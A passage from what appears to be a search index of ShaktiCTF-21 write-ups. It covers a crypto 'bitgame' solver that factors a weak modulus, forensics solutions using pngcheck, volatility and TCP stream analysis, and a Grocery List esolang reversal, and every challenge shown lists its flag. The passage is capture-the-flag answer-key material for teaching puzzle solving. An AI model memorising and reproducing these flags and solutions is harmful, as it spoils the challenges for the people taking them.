371441671537548617833261377684573395637718098377L, 73503179213393913023704937289223113070710436178L, 14278600014834517753559474524037832942635927659L, 95979312957862956641244586033112513755803077444L, 123611849060591463856666997035364759427112812349L, 250267505390780054373759212573794114332304420897L, 274331340187983766414970375369314382470309923528L, 530954278326398757599110590629998236194873705738L, 445063803639254844602118928332995402727991005526L, 477536316882356739806381795009989191971022494775L, 145806534277604580875808969952673951890456430994L, 338617094019005929131671762676393196161129291273L, 787986998792470243821397305866328174678704601832L, 797681956485293402755781130144373911193743174116L, 102568133699310747724426519505517138297342928702L, 485973235220253658819163335922664305614753222737L, 708864866282153909934399948843210933312918475225L, 308869644059764204860466118240550021785346378407L, 265134597784188972044817186771092475529959115280L, 658630862233825651846758771232193854753199783323L, 410299892119423701050427477155381392726923211285L, 6310556712134526086449137092667549852236480664L, 721490244153294996049060382571833870041784134677L, 189255620808066245253673434834382588149476325354L, 656660321216535035554868867584817446419376547800L, 227454614460719041137689443422767765867650838496L, 564044834979679073000283863743361202562615780677L, 819497725880056350642396338505462063661613081114L, 221608084786562734221253860081125113787049343286L, 65545019154510438233732307194863607751031185596L, 501764965357482269727888050687089193157839203155L, 12596049711442079696416208815415678242091492882L, 608335000655435283873776788164729624608624817344L, 769164412496263133567276017296030606229830101938L, 664392246067357098877579195261219487179986160723L, 75996028618380983622275289805057198859844565452L, 672253925254041921269524864028282672756772077887L, 10895374234330584911367787251440628566929185900L, 142938310359303082468235486875054184138048896491L, 580034759791051467570186991460531038900679165541L, 287969775416861410657459226277133443501613853261L, 283979020686970117242427425329619893769855354427L, 49347852309409910369201393348291141557656286601L, 624150486700256698789404049401551672419608893976L, 454233579238810112360216789636690941906069484L, 690476396562361518729054252655764072124449268089L, 364952245729150423326049996389508037748559889683L, 46898493332148283155094923745254689993163426686L, 721357617282368645994984755385188516191333854333L, 668358240156477324515019332670949254186522240400L, 530146560534258049207674282686131830473272127904L, 421240386903585887479293913607895739401770216131L, 131544157730297580532376112097192541317179941259L, 53769876913560242076228652083351431136553941165L, 324630132786079151774454244099857497319443044190L, 55914569733303855249647496460820458501426747612L, 356460015927961571935862199999992385930644898065L, 381970962369842965489276922281370450755149773458L, 377925988386382827724043815986127076122697666178L, 170391875451406681354914296500571079580495228122L, 500412216700342254882222529341044797546002378807L, 270482626136675206071126080144589222444978935258L, 510204515848361838813066544104229196649427634721L, 694801815446371547162777895975222045949858069418L, 739395372540171364253886631013817491306399454241L, 188905973397720824340314521621708188756348481623L, 487870658355564402820834450621197405413234278639L, 319933909357132234363354760423492914423939767405L, 263703052554121451143337156067968794709832976406L, 570885622346973806312331572767432345815012650994L, 613648216706507119609753855305736669966565489982L, 362055399017830857419118173194209585364129442109L, 464810998911591121288542168872550032794798575825L, 196427036821223400365200413058345761514591417071L, 25628609184402392719234409827173411591973261458L, 389660521648409036834014768969265025739038255604L, 384795004021400423555640099529367625348372390881L, 707289989717621963077194153935371259310016146498L, 670156226011236402401031750316704325477772529598L, 629478318010023990541972179492930924715945763382L, 420764775998999021307498556733386932841231547252L, 251295036637272900755099390296951302668662082535L, 169181615309865901082109507073231110967263343231L, 727702942882742898038421109217524091767497663579L, 83024833885016173065293040667506410015938527209L, 590299697981360913335337981554769685232278816484L, 839249169584760629344409812254395370637808942355L, 2532976737131698067709154159037178901016309877L, 827937908618358796220690459011146862691362111002L, 207856757362656702785928558342235732619155859448L, 769440512853837881195823544868309771285163168637L, 150792348186937950818307794770276348445131352633L, 406447664606606744239239241303236797113232638462L, 684929378565763960066686307141328078651822393408L, 224654949657621819479575791369530594184155735377L, 359668158337346821455429069306126150792495076312L, 426060019926904837328971794380434549817610220732L, 505900793827530726062521493253102791728579635544L, 574338323217068317021970616387654890577373082437L, 488642086812332277755648129901622844016014181036L, 782798139277588726443102861877502720631068154149L, 324941005837173666916146304702575016292154648894L, 599252796763371419729714377145026171271223602258L, 288626676593421098489763933781298880420148163084L, 467935558547944283971065855963398198551871488940L, 761714358296754159904539604281904852153669298518L, 276446988966064634125865380166049029609802351898L, 369023293814293814154164274667350587946664894323L, 717575431771607488393572799869825518074253493155L, 118574849771069306281658344868625779723252233598L, 12370452420955837433680686183877312882669690356L, 302301431161391687343955867699420163562587859945L, 195371671757690146983317782756160228746356628053L, 398747732493308984681571661499786666875939301584L, 698066685291591126425888078294753343383201876605L, 740615239592232339016993695884773933922478083470L, 106890365483452085129238401357149755728096568181L, 675424749894236876558905109629365681327887392939L, 201302679654677994076085404830210315546203833631L, 44180267617276864922134072223207783121823083760L, 124456735968311732522942481244765035866893530651L, 417097239834755904408684513793979044196227705274L, 233788505090359270398498540249276534994456393509L, 784883544295792169888524547442249976612414385390L, 263927032662315532641804497592590261948623275544L, 230408128635809022368695431658123209759525446197L, 828438163544123004635226007093619116738969501455L, 131177833362897071821531267320249645985720757061L, 282559114644612791250228142178864990076027445349L, 51535753100637770749762754865965551911906842650L, 75639553057595587596260623277885037750125179263L, 58473575929726038902167525004493155853338472174L, 644200156245117800830127150551293667263711884010L, 59336566770535954402402035001334688195109558183L, 325545043540004593614133895407411121346920176287L, 386730240555902975565127557492240699320716883276L, 107832757107482266991355321046790326277959386133L, 828353615833264639624534978723116154197590072611L, 437040243883858950708846625114604220964420978147L, 803398029066860857025331241486964965031131551855L, 576964537171426515123456361528143227570520116021L, 809583738378871906451344170063186991235371039023L, 823305093786540109619869220762083224118345164231L, 411621562624640152400201282326942360790677410663L, 231940523067486950068748404474658124358585742451L, 604140702068928167426636914613216363264491139925L, 182549530248750772516328059170083331367736115014L, 351272332765569839425323248007300819393087347081L, 808051965718020879122522501107824643411794084717L, 435313223797686028005157782836052182346489443562L, 773290097747317561689672554732697061093259735422L, 494807743119295726369579141007071491416325582655L, 374920928368387309057243128392752000439621200886L, 20308207759197365626061325015796899552114404367L, 219468272654429509419082815650800497195671108828L, 81139930848333886667752156803811140821451629059L, 569841453048534459795682040530849453115831698992L, 219815172001382756213076518296618693861215663555L, 315228832309928783802974983540753584930582247996L, 521351457638018908013070218723655643353193350239L, 837078355322582540009573068258668145024145790857L, 305949280410779965167795125684763760979096567656L, 752734535504843782529733381847990120498024803199L, 130979635848607595450001756874180120833056339272L, 127380462105684333862449267491349897546937670062L, 831464164576028236819157664155629321588853884506L, 458553646896923021292508986645409497433444903480L, 331547581789456197823262914448841887743389126588L, 687438850344432414366519941161325929797010982058L, 46814190784385113831609191671871870377062343969L, 367204250911005382086630700883675824898695572800L, 837950709225208622477048636848957743414279375406L, 755979086689398053301176627949234797669290978111L, 463929034563763591426239863240035335944307807918L, 388056079877348208051659258366423130180840108779L, 481802465454467461901032139782822670524640782774L, 701079443559078618728078108282845476374731501563L, 334745542222185197153180834408788144100538013756L, 253145560380270643162860828610515679311935720072L, 395630118318640218770711387893972244901063806635L, 208106342863019937023658673932614122363417212569L, 800934699010135610598225595151405276781918908874L, 696336112960889233518724992191716194527976985507L, 300286054927681941643313635323094504882574668063L, 458789329000502799100156566567758633503913820978L, 708175590579955723202930994812768283855064465047L, 587984734773590846183205937392451653174439236906L, 823762034931564176090815640023005894001280083927L, 524050296443714423381097945460586696978946512362L, 826146010460282803089280095111726046618296418403L, 738059115420803411392019151234924442822894137372L, 785923027603124246693527973036116119960741214026L, 252991902280292538077710740416727662292106903638L, 612730418549786530304086962840101299076730718334L, 69668983448626635123547735831825182040773807879L, 739161334792019562944848789255480347264595497250L, 426088326883952707470818191951397422806811512699L, 609894411725117311887748173369827266668614691266L, 165292756235797442318361854602140226544694739311L, 589667800107858677593289168022975113313550682848L, 640857564932560426034113458302923984027810983424L, 433295904246129548439611855874554726964056196739L, 295736828268442704674230280994652730936476162079L, 362750821004685893453136326523511170789437995781L, 589336117631319830914706810245178694288089137894L, 811399758747533046016039717227711274741061322838L, 27580861145202333471323495462147840357753419133L, 470227706417198698085667542317817787181959330535L, 584323275788057749480505550524460240732635160625L, 237827904233525417474165042101078126135986675291L, 185838249618402980174158400553291130995482918982L, 716717904900153456374864913024565035802728872046L, 299928293393029561935406197987330775735773835320L, 610584168172650199159224372380373439956634978704L, 690408099401618105598728398222166520124608190031L, 283306897206518288330461379029998212937266204548L, 817789019703352399202811822660012332372841442630L, 220127609791912011108106028754496869303560001849L, 246504269062014401534735358881601032162158759689L, 46082991319083955224175960690398710532164487906L, 212751399833511915627540175127168811177001660515L, 385250717564324096772476620548142926475688319557L, 61365581213548006550836975224755122334454850567L, 500463428035823554224310567250695080325995136096L, 61899143940365444140145428783315450062301530480L, 203025377470260666449657924180136421473514357156L, 123908476681846473673931773788947788317808065213L, 195215144275960912638932735284434043560100707418L, 133310257625037249927206630090100662665907910449L, 276367955374261543252723006408725695641217591135L, 663820798437396723050278496454824751706073882376L, 627376994406926072818386443662506537498856251729L, 807263912057381638138372982429348018327576023228L, 818554198814274015966753870605601199174333968563L, 529245620163810217622982543182351257311767464391L, 546398992629494812601212735149228626834119169658L, 788234766026477342751189473804919448998384347820L, 167271976519951808827353512125697808810338462380L, 430534784945777772222546078201421648977639348392L, 566978025835009408463135989978297395594607030631L, 727029425844280750981029116965799959144058594190L, 448139533138455217978527391597808802026293321469L, 151729712152759812390167470675728297857929105951L, 657791674324077339300884249739164923180072401180L, 424404948439217017610243837136383380191856871586L, 455777852150250746502732696760882431897002125490L, 118395806165479611207400242952156754708902219616L, 651998890970295878824168089404549122037582504955L, 318053786402730632110007904507392367956281607521L, 89256996994847882782731727353769430635891555271L, 191640633961245854939398057878203554179178922625L, 776093243824038694002940702752259227273873370266L, 604808053552832309560700585581226890424168461228L, 696457148711375718900956512475692076017562220382L, 225740711410466953926721086553814924866335860229L, 779384895686875556285208428413344125970531184120L, 80036196428413356900967644789298317424533638010L, 822496368697611448419908595847938425766407310386L, 834931499492006898642424172352707198872177553902L, 698414105277227047734122275193896168604649888702L, 529758554002809089081465457150468189507830589413L, 717258925424201058322126193594043182379350820121L, 545320778959010102117304312285631032420173177586L, 198810957950627600434822289656001469986862095348L, 396686025175354098156566844871532163846424230341L, 695402937231760183954791141361421552844300447983L, 616359789228266349699343794021003938187153822056L, 605577098887398262759634549331644256082166532624L, 601338707988632159208727568593686398013820974578L, 602334758345704224480697812073862084189082659829L, 199993895840217594422160437717413997273424537729L, 301172881601039569961892167965346000465469196938L, 270479627692150358469747722957892647453928511135L, 326335212710487507108472271822639699064648093691L, 106777921739243304370773085119576780949295942475L, 167071874552627084471353729657264563338026693956L, 197386913819707750998548688666241780705209642981L, 333989154944272765126437456969009498043248355518L, 434050250540343912275467215058298016032888176906L, 725401040393076792082841393446779306613460301273L, 727195206457435913302519991149583073712130944332L, 71590043050251237974379603651300783856190315391L, 793139264226788841507794442559678297202409093836L, 378525088022847526633162652098970409025974176857L, 64801404877308530110643631000410492805816851806L, 643972961663258149439837603423804897541649156072L, 157478292833194737519619595267874394324268309984L, 134041615706387295807480733390897871749463349268L, 461258613878623602622274059869770203247750228227L, 625872418231109115583561800171823884770612992316L, 237401566421194941434761956019939328673784029053L, 352405224268011659966413741974587740202212965590L, 116884396815801319245874245933296320636289143041L, 283195867540544834172532403440934521697373549015L, 689140484289234758370348531544928691906949176271L, 193196143026619464739760509606724898405753196236L, 67085710038260071732180539591066081368573964447L, 791794421731500760432508508849445876352096030071L, 432475128267108313460692996087695700599634295795L, 685073149783887985113269353340454247763263219124L, 335833908379012325847781848040473707739024530929L, 220612931303802409528417426553183475490460728373L, 291854819805074338140207394148645955031098744378L, 714515251507395673121930785122395634981321413798L, 724693143577584941911193410692637232099404458917L, 611243364076247112840263509691315114388391971369L, 229795860797995375715782537388782018888177477019L, 296341917462921514026327489596409707263895273191L, 309740425030881907897587814686626624055404447246L, 671631272527133996290893591609221360527257103885L, 218905811821960994832449103806857649781424376178L, 429772382896991457674660590568850053767362874075L, 250175727687874743892420590416583480995866963574L, 220396487416821216308222497372918137375558487785L, 248632603454655733234736595964105946950230116916L, 227496926861674027230311767436572791705586083714L, 519824104424885904393303337198605448578756909808L, 795103589371838503191297936262867047859443076904L, 244542828172213041199894799012547508435456165435L, 50052840614934527554894507145108176434868736721L, 539864968707154388655261925196382978215459738283L, 273582666961051735607824388845532732241288761719L, 531514886312313973773063924153516924192418657044L, 101484196383889500114457151515690119406749520478L, 404547795626034292311498435162286213193191412452L, 250171257240814875397420693184875445138996688633L, 211239841284623887225478944285253370693514862872L, 33702581727268200448000963472643896415286212021L, 727954030308555513888383002365701074524660686267L, 296372634680510180045698528854832499158025138767L, 103639178450743820451116640692980921644914754181L, 381056138816946574321553076345557659912184128071L, 220363775860108926430412133120609969043172885719L, 828380089804826191248904060499310291984337292267L, 240818837128375459115613365004393187326689178106L, 599714327776873507299886356592570412302353344127L, 514039904560736346483340269688580936191901954975L, 838405528426499141475985982949569190893885957871L, 67178744880390923276819786579857611880328181620L, 821336351518183360948635849459228489892497850605L, 465122017037822859400169939428274438908366165072L, 95264823246420773240792527458136208743710928871L, 158144519740001444337707734860202573635872827543L, 689985808396255471137327738486051869204812470986L, 550134662580703482270292485064392354509835320583L] Each bit is encrypted using unknown numbers, except the modulus. But, on checking the modulus, one can find that it is factorizable . Next step is to question if one can find which bit is being encrypted. For that, we need to check: pow(ct[i],phin//5,n) == 1 #this tells that the bit encrypted is 0 else 1 Solution Script: from Crypto.Util.number import * n = 839647959743379757835423741637185376972991646369 p,q = 716158806799958648435521, 1172432638921544069685089 f = open('ciphertext.txt').read() L = eval(f) #FYI: This is a dangerous function :P pt = \"\" for i in L: phi = (p-1)*(q-1) d = (phi*inverse(5,n))%n if (pow(i,d,n) == 1): pt = pt + '0' else: pt = pt + '1' print long_to_bytes(int(pt,2)) Flag: shaktictf{Awesome!!YouAreANumberTheoryExpert!!KeepGoing}","title":"bitgame"},{"location":"ShaktiCTF21/crypto/intro/","text":"Cryptography Introduction \"The following repo contains writeups of challenges created for ShaktiCTF-21\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. ShaktiCTF bitgame - Sowmya Awesome Encryption Scheme - Sowmya","title":"Cryptography"},{"location":"ShaktiCTF21/crypto/intro/#cryptography","text":"","title":"Cryptography"},{"location":"ShaktiCTF21/crypto/intro/#introduction","text":"\"The following repo contains writeups of challenges created for ShaktiCTF-21\"","title":"Introduction"},{"location":"ShaktiCTF21/crypto/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. ShaktiCTF bitgame - Sowmya Awesome Encryption Scheme - Sowmya","title":"The contents of this repo"},{"location":"ShaktiCTF21/forensics/chunkies/","text":"Chunkies Challenge Description We could only retrieve only this file from the machine, but looks like this is corrupted. Can you recover the file? Challenge Author v1Ru5 Short Writeup The given PNG file is corrupted. Correct the header of the image. Fix IDAT and IEND chunks. On using the tool 'pngcheck' on the image, we see that there is a CRC error which can be directly corrected. Flag shaktictf{Y4YyyyY_y0u_g0t_1T}","title":"Chunkies"},{"location":"ShaktiCTF21/forensics/chunkies/#chunkies","text":"","title":"Chunkies"},{"location":"ShaktiCTF21/forensics/chunkies/#challenge-description","text":"We could only retrieve only this file from the machine, but looks like this is corrupted. Can you recover the file?","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/chunkies/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/chunkies/#short-writeup","text":"The given PNG file is corrupted. Correct the header of the image. Fix IDAT and IEND chunks. On using the tool 'pngcheck' on the image, we see that there is a CRC error which can be directly corrected.","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/chunkies/#flag","text":"shaktictf{Y4YyyyY_y0u_g0t_1T}","title":"Flag"},{"location":"ShaktiCTF21/forensics/delete/","text":"Delete Challenge Description Sometimes what you see is not always true... Challenge Author v1Ru5 Short Writeup When we use any hex editor, we find that there are two PNG headers. Removing the bytes before the second PNG header gives us the flag. Flag shaktictf{Y0u_4R3_aM4z1nG!!!!}","title":"Delete"},{"location":"ShaktiCTF21/forensics/delete/#delete","text":"","title":"Delete"},{"location":"ShaktiCTF21/forensics/delete/#challenge-description","text":"Sometimes what you see is not always true...","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/delete/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/delete/#short-writeup","text":"When we use any hex editor, we find that there are two PNG headers. Removing the bytes before the second PNG header gives us the flag.","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/delete/#flag","text":"shaktictf{Y0u_4R3_aM4z1nG!!!!}","title":"Flag"},{"location":"ShaktiCTF21/forensics/find/","text":"Find Me Challenge Description We found that there was a secret communication between two criminals. Can you find out the secret information? Challenge Author v1Ru5 Short Writeup Following up the TCP stream gives us this: 98 106 66 48 100 71 103 48 100 71 86 104 78 88 107 61 On converting the numbers from decimal to ASCII gives us 'bjB0dGg0dGVhNXk=' which when base64 decoded gives 'n0tth4tea5y'. The second TCP stream gives us a reversed zip file which after reversing back and using 'n0tth4tea5y' as the password gives us flag.txt. Flag shaktictf{g00d_lUcK_4_tH3_n3xT_cH411eNg3}","title":"Find Me"},{"location":"ShaktiCTF21/forensics/find/#find-me","text":"","title":"Find Me"},{"location":"ShaktiCTF21/forensics/find/#challenge-description","text":"We found that there was a secret communication between two criminals. Can you find out the secret information?","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/find/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/find/#short-writeup","text":"Following up the TCP stream gives us this: 98 106 66 48 100 71 103 48 100 71 86 104 78 88 107 61 On converting the numbers from decimal to ASCII gives us 'bjB0dGg0dGVhNXk=' which when base64 decoded gives 'n0tth4tea5y'. The second TCP stream gives us a reversed zip file which after reversing back and using 'n0tth4tea5y' as the password gives us flag.txt.","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/find/#flag","text":"shaktictf{g00d_lUcK_4_tH3_n3xT_cH411eNg3}","title":"Flag"},{"location":"ShaktiCTF21/forensics/follow/","text":"Follow Up Challenge Description We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret. Challenge Author v1Ru5 Short Writeup Just follow up the TCP stream to get the links for pastebin. The last link contains the real flag. Flag shaktictf{Th15_w4s_eA5Y!!}","title":"Follow Up"},{"location":"ShaktiCTF21/forensics/follow/#follow-up","text":"","title":"Follow Up"},{"location":"ShaktiCTF21/forensics/follow/#challenge-description","text":"We got a clue from one of our investigators that an interesting secret was transferred in our network. Help us find out the secret.","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/follow/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/follow/#short-writeup","text":"Just follow up the TCP stream to get the links for pastebin. The last link contains the real flag.","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/follow/#flag","text":"shaktictf{Th15_w4s_eA5Y!!}","title":"Flag"},{"location":"ShaktiCTF21/forensics/help/","text":"Help Me Challenge Description Our department had taken up the responsibility of solving a mysterious case but unfortunately our system crashed. We could only recover this memory dump. Your job is get all the important files from the system and use the files to find out the secret informatiom. Challenge Author v1Ru5 & bl4ck_Widw Short Writeup We use the tool 'volatility' for this challenge. This command gives us the first part. volatility -f Challenge.vmem --profile=Win7SP1x64 cmdscan Which on base64 decoded gives us 'shaktictf{H0p3'. volatility -f Challenge.vmem --profile=Win7SP1x64 filescan shows that there are two useful files Part II.png and L4ST.py.zip. Extract both the files. Apply 'zsteg' on the PNG image and we got the second part of the flag \" y0U_l1k3d \". The zip file has a python script which needs to be reversed. def tryin(text,s): result = \"\" for i in range(len(text)): char = text[i] if(char.isnumeric()): result+=(chr(ord(char)+1)) elif(char.isupper()): result += chr((ord(char) - s-65) % 26 + 65) else: result+=(chr(ord(char)^1)) return result def checkin(inp): for i in range(len(inp)): if(len(inp)<=7): Z.append(chr(ord(inp[i])-i+1)) else: Z.append(chr(ord(inp[i])-4)) return(''.join(Z)) # Giving the input \"y>v<^xd::439064..y\" as the string from the challenge , gives us our input to be used: X=\"uh27bio:uY<xrA.\" s=4 y=[] Z=[] Y=[] k=[] X=checkin(X) y=tryin(X,s) print(\"input: \"+y) which gives the last part of the flag \"th15_ch4lL3ng3!}\" Flag shaktictf{H0p3_y0U_l1k3d_th15_ch4lL3ng3!}","title":"Help Me"},{"location":"ShaktiCTF21/forensics/help/#help-me","text":"","title":"Help Me"},{"location":"ShaktiCTF21/forensics/help/#challenge-description","text":"Our department had taken up the responsibility of solving a mysterious case but unfortunately our system crashed. We could only recover this memory dump. Your job is get all the important files from the system and use the files to find out the secret informatiom.","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/help/#challenge-author","text":"v1Ru5 & bl4ck_Widw","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/help/#short-writeup","text":"We use the tool 'volatility' for this challenge. This command gives us the first part. volatility -f Challenge.vmem --profile=Win7SP1x64 cmdscan Which on base64 decoded gives us 'shaktictf{H0p3'. volatility -f Challenge.vmem --profile=Win7SP1x64 filescan shows that there are two useful files Part II.png and L4ST.py.zip. Extract both the files. Apply 'zsteg' on the PNG image and we got the second part of the flag \" y0U_l1k3d \". The zip file has a python script which needs to be reversed. def tryin(text,s): result = \"\" for i in range(len(text)): char = text[i] if(char.isnumeric()): result+=(chr(ord(char)+1)) elif(char.isupper()): result += chr((ord(char) - s-65) % 26 + 65) else: result+=(chr(ord(char)^1)) return result def checkin(inp): for i in range(len(inp)): if(len(inp)<=7): Z.append(chr(ord(inp[i])-i+1)) else: Z.append(chr(ord(inp[i])-4)) return(''.join(Z)) # Giving the input \"y>v<^xd::439064..y\" as the string from the challenge , gives us our input to be used: X=\"uh27bio:uY<xrA.\" s=4 y=[] Z=[] Y=[] k=[] X=checkin(X) y=tryin(X,s) print(\"input: \"+y) which gives the last part of the flag \"th15_ch4lL3ng3!}\"","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/help/#flag","text":"shaktictf{H0p3_y0U_l1k3d_th15_ch4lL3ng3!}","title":"Flag"},{"location":"ShaktiCTF21/forensics/intro/","text":"Forensics Challenge Name Level Author Concept Follow Up Very Easy v1Ru5 Network Delete Easy v1Ru5 File Chunkies Easy v1Ru5 File Find Me Medium v1Ru5 Network Help Me Hard v1Ru5 & Memory bl4ck_Widw","title":"Forensics"},{"location":"ShaktiCTF21/forensics/intro/#forensics","text":"Challenge Name Level Author Concept Follow Up Very Easy v1Ru5 Network Delete Easy v1Ru5 File Chunkies Easy v1Ru5 File Find Me Medium v1Ru5 Network Help Me Hard v1Ru5 & Memory bl4ck_Widw","title":"Forensics"},{"location":"ShaktiCTF21/misc/decodeit/","text":"decodeit Points : 100 Challenge description DECODE IT! Author bl4ck_Widw Writeup: use zbarimg to decode . flag =shaktictf{N1C3_w0rK_Fr13nD}","title":"decodeit"},{"location":"ShaktiCTF21/misc/decodeit/#decodeit","text":"","title":"decodeit"},{"location":"ShaktiCTF21/misc/decodeit/#points-100","text":"","title":"Points : 100"},{"location":"ShaktiCTF21/misc/decodeit/#challenge-description","text":"DECODE IT!","title":"Challenge description"},{"location":"ShaktiCTF21/misc/decodeit/#author","text":"bl4ck_Widw","title":"Author"},{"location":"ShaktiCTF21/misc/decodeit/#writeup","text":"use zbarimg to decode . flag =shaktictf{N1C3_w0rK_Fr13nD}","title":"Writeup:"},{"location":"ShaktiCTF21/misc/grocery/","text":"Grocery List Writeup This challenge was based on an esolang programming language(Grocery List) as the challenge name suggested. First decode the Base64 string given: ```Reverse GroceryPlace vichyssoise mango vermouth zucotto sandwich lamb veal yogurt vermicelli zucchini salmon fennel seeds ice cream carrots unagi inca berries cabbage upma grapes naan apples bananas almonds basil fenugreek potatoes pie soy beans eggs tunafish Find the input to the following output. OUTPUT: 4cum77itQdKy4r7c~rm5u05plN``` After decoding, it says that some input is passed to the grocery list given and we receive an output for that. This suggests that this talks about some kind of a program. On googling we find an esolang Grocery List The language is based on stack operations. So here is an interpretation of the first interation of the code. 1 mango vermouth zucotto sandwich``` Fist item starting with a `v` is skipped and ascii of the first letter of next item is pushed. So 109 is pushed to the stack. ```109 <-TOP/BOTTOM``` Similarly next item starts with a v, so it's ignored and ascii of the following item is taken. Pushed ascii value of `z` to the stack. ```109 <-BOTTOM 122 <-TOP``` The last line here starts with an s which first pop top two values and then subtacts second to top from top.This pushes 13 onto the stack ```13 <-TOP/BOTTOM``` **2** ```lamb veal yogurt vermicelli zucchini salmon fennel seeds Starts a loop. Then pushes 1 onto the stack(as shown in previous step) 13 <-BOTTOM 1 <-TOP The last line starts with an f and interchanges the top two values of stack. 1 <-BOTTOM 13 <-TOP 3 ice cream carrots unagi inca berries cabbage upma Takes and input and pushes it's ascii to the stack. Let's say first input is a . 1 <-BOTTOM 13 97 <-TOP Next, item starts with c arrots, so it duplicates value on top. And then the next item starting with u brings the value on top of the stack to BOTTOM 97 <-BOTTOM 1 13 97 <-TOP Similary next item i nca berries does the same as above. Let's say the second input is b After the next 3 operations: 98 <-BOTTOM 97 1 13 97 98 <-TOP 4 naan apples bananas almonds basil``` Next item starting with `g` works like an if statement. Looking here, TOP > second-to-TOP. Hence pushed 1 onto stack. And then pushes 4. (from `n`) And then pops top two and adds. ```98 <-BOTTOM 97 1 13 5 <-TOP``` Next item `b`ananas brings value from bottom of stack to top. And then add top two after popping and then push the result. And finally brings the other input from bottom of stack ```1 <-BOTTOM 13 103 97 <-TOP``` **5** ```fenugreek potatoes pie soy beans eggs tunafish``` Interchange the op two value of stack (`f`) Pop and print the top. (`p`) Pop and print the top again. (`p`) We see here that our second input is the one that will be changed each time. ```1 <-BOTTOM 13 <-TOP``` ```Printed: ga``` Next item `s`oy beans, subtract top two values. `e` checks for an end for the loop. So here we understand that, the loop is running 13 times. Hence 26 characters. ```12 <-TOP/BOTTOM``` ## Solution ```python a = \"4cum77itQdKy4r7c~rm5u05plN\" o = \"\" for i in range(0,26,2): if((ord(a[i]) - 5) > ord(a[i+1])): o = o + a[i+1] o = o + chr(ord(a[i]) - 5) else: o = o + a[i+1] o = o + chr(ord(a[i]) - 4) Flag shaktictf{c0mp73tedMyGr0c3ry5h0pp1Ng}","title":"Grocery List"},{"location":"ShaktiCTF21/misc/grocery/#grocery-list","text":"","title":"Grocery List"},{"location":"ShaktiCTF21/misc/grocery/#writeup","text":"This challenge was based on an esolang programming language(Grocery List) as the challenge name suggested. First decode the Base64 string given: ```Reverse GroceryPlace vichyssoise mango vermouth zucotto sandwich lamb veal yogurt vermicelli zucchini salmon fennel seeds ice cream carrots unagi inca berries cabbage upma grapes naan apples bananas almonds basil fenugreek potatoes pie soy beans eggs tunafish Find the input to the following output. OUTPUT: 4cum77itQdKy4r7c~rm5u05plN``` After decoding, it says that some input is passed to the grocery list given and we receive an output for that. This suggests that this talks about some kind of a program. On googling we find an esolang Grocery List The language is based on stack operations. So here is an interpretation of the first interation of the code. 1 mango vermouth zucotto sandwich``` Fist item starting with a `v` is skipped and ascii of the first letter of next item is pushed. So 109 is pushed to the stack. ```109 <-TOP/BOTTOM``` Similarly next item starts with a v, so it's ignored and ascii of the following item is taken. Pushed ascii value of `z` to the stack. ```109 <-BOTTOM 122 <-TOP``` The last line here starts with an s which first pop top two values and then subtacts second to top from top.This pushes 13 onto the stack ```13 <-TOP/BOTTOM``` **2** ```lamb veal yogurt vermicelli zucchini salmon fennel seeds Starts a loop. Then pushes 1 onto the stack(as shown in previous step) 13 <-BOTTOM 1 <-TOP The last line starts with an f and interchanges the top two values of stack. 1 <-BOTTOM 13 <-TOP 3 ice cream carrots unagi inca berries cabbage upma Takes and input and pushes it's ascii to the stack. Let's say first input is a . 1 <-BOTTOM 13 97 <-TOP Next, item starts with c arrots, so it duplicates value on top. And then the next item starting with u brings the value on top of the stack to BOTTOM 97 <-BOTTOM 1 13 97 <-TOP Similary next item i nca berries does the same as above. Let's say the second input is b After the next 3 operations: 98 <-BOTTOM 97 1 13 97 98 <-TOP 4 naan apples bananas almonds basil``` Next item starting with `g` works like an if statement. Looking here, TOP > second-to-TOP. Hence pushed 1 onto stack. And then pushes 4. (from `n`) And then pops top two and adds. ```98 <-BOTTOM 97 1 13 5 <-TOP``` Next item `b`ananas brings value from bottom of stack to top. And then add top two after popping and then push the result. And finally brings the other input from bottom of stack ```1 <-BOTTOM 13 103 97 <-TOP``` **5** ```fenugreek potatoes pie soy beans eggs tunafish``` Interchange the op two value of stack (`f`) Pop and print the top. (`p`) Pop and print the top again. (`p`) We see here that our second input is the one that will be changed each time. ```1 <-BOTTOM 13 <-TOP``` ```Printed: ga``` Next item `s`oy beans, subtract top two values. `e` checks for an end for the loop. So here we understand that, the loop is running 13 times. Hence 26 characters. ```12 <-TOP/BOTTOM``` ## Solution ```python a = \"4cum77itQdKy4r7c~rm5u05plN\" o = \"\" for i in range(0,26,2): if((ord(a[i]) - 5) > ord(a[i+1])): o = o + a[i+1] o = o + chr(ord(a[i]) - 5) else: o = o + a[i+1] o = o + chr(ord(a[i]) - 4)","title":"Writeup"},{"location":"ShaktiCTF21/misc/grocery/#flag","text":"shaktictf{c0mp73tedMyGr0c3ry5h0pp1Ng}","title":"Flag"},{"location":"ShaktiCTF21/misc/intro/","text":"Misc Challenge Name Level Author Concept decodeit easy bl4ck_Widw barcode Grocery List medium imm0rt4l_5t4rk esolang","title":"Misc"},{"location":"ShaktiCTF21/misc/intro/#misc","text":"Challenge Name Level Author Concept decodeit easy bl4ck_Widw barcode Grocery List medium imm0rt4l_5t4rk esolang","title":"Misc"},{"location":"ShaktiCTF21/pwn/intro/","text":"","title":"Intro"},{"location":"ShaktiCTF21/reversing/Margaret/","text":"Author Simran Sandra Challenge Short Writeup The challenge was a packed GoVM binary which had a hidden flag. The intended solution to the challenge being, to solve the challenge the intended solution is to go through the binary and find out the conditions to be satisfied for the input to satisfy and add the constraints to the z3 solver. Solver result = 